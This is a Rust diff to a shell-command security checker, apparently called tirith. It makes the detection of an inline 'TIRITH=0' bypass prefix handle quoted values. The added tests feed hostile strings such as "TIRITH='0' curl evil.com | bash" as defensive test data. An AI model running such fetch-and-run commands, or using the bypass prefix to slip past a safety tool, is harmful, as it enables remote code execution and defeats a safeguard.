@@ -35,6 +35,25 @@ pub struct AnalysisContext {
     pub clipboard_html: Option<String>,
 }
 
+/// Check if a word is `TIRITH=0` with optional quotes around the value.
+/// `split_raw_words` preserves quotes, so we need to match `TIRITH='0'` and
+/// `TIRITH="0"` in addition to the bare `TIRITH=0`.
+fn is_tirith_bypass_assignment(word: &str) -> bool {
+    if let Some(val) = word.strip_prefix("TIRITH=") {
+        let stripped = if val.len() >= 2
+            && ((val.starts_with('"') && val.ends_with('"'))
+                || (val.starts_with('\'') && val.ends_with('\'')))
+        {
+            &val[1..val.len() - 1]
+        } else {
+            val
+        };
+        stripped == "0"
+    } else {
+        false
+    }
+}
+
 /// Check if the input contains an inline `TIRITH=0` bypass prefix.
 /// Handles bare prefix (`TIRITH=0 cmd`) and env wrappers (`env -i TIRITH=0 cmd`).
 fn find_inline_bypass(input: &str, _shell: ShellType) -> bool {
@@ -48,7 +67,7 @@ fn find_inline_bypass(input: &str, _shell: ShellType) -> bool {
     // Case 1: Leading VAR=VALUE assignments before the command
     let mut idx = 0;
     while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
-        if words[idx] == "TIRITH=0" {
+        if is_tirith_bypass_assignment(&words[idx]) {
             return true;
         }
         idx += 1;
@@ -67,7 +86,7 @@ fn find_inline_bypass(input: &str, _shell: ShellType) -> bool {
                     break;
                 }
                 if tokenize::is_env_assignment(w) {
-                    if w == "TIRITH=0" {
+                    if is_tirith_bypass_assignment(w) {
                         return true;
                     }
                     idx += 1;
@@ -86,7 +105,7 @@ fn find_inline_bypass(input: &str, _shell: ShellType) -> bool {
             }
             // Check remaining words after -- for TIRITH=0
             while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
-                if words[idx] == "TIRITH=0" {
+                if is_tirith_bypass_assignment(&words[idx]) {
                     return true;
                 }
                 idx += 1;
@@ -710,7 +729,7 @@ fn sanitize_view(s: &str) -> String {
     // at most ~30 bytes ("... [truncated, 999999 bytes]"), so we reserve
     // space for it to ensure the final output never exceeds MAX_BYTES.
     const MAX_BYTES: usize = 512;
-    const MARKER_RESERVE: usize = 40; // enough for "... [truncated, {N} bytes]"
+    const MARKER_RESERVE: usize = 50; // enough for "... [truncated, {N} bytes sanitized]"
     let total = s.len();
     let full_len = sanitize_view_full_len(s);
     let needs_truncation = full_len > MAX_BYTES;
@@ -1253,6 +1272,30 @@ mod tests {
     fn test_inline_bypass_env_dashdash() {
         assert!(find_inline_bypass(
             "env -- TIRITH=0 curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_single_quoted_value() {
+        assert!(find_inline_bypass(
+            "TIRITH='0' curl evil.com | bash",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_double_quoted_value() {
+        assert!(find_inline_bypass(
+            "TIRITH=\"0\" curl evil.com | bash",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_env_quoted_value() {
+        assert!(find_inline_bypass(
+            "env TIRITH='0' curl evil.com",
             ShellType::Posix
         ));
     }
